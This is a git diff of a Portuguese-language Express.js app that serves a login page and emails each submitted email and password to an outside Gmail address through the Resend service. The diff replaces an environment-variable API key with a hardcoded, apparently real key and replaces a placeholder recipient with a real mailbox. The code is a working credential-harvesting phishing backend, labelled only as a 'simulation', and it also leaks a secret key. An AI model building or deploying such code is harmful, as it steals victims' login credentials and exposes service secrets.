@@ -7,8 +7,8 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// Inicializa Resend com a variável de ambiente
-const resend = new Resend(process.env.RESEND_API_KEY);
+// Inicializa Resend com sua API Key
+const resend = new Resend('re_bjc3V1g6_JDBHpPnr1vUPjMASnzUa46MA');
 
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
@@ -20,7 +20,7 @@ app.post('/', async (req, res) => {
   try {
     await resend.emails.send({
       from: 'simulacao@connect.com',
-      to: 'seuemail@empresa.com', // troque pelo seu email real
+      to: 'globalsystemdiretoria@gmail.com',
       subject: 'Dados capturados na simulação',
       html: `<p><strong>Email:</strong> ${email}<br><strong>Senha:</strong> ${senha}</p>`
     });
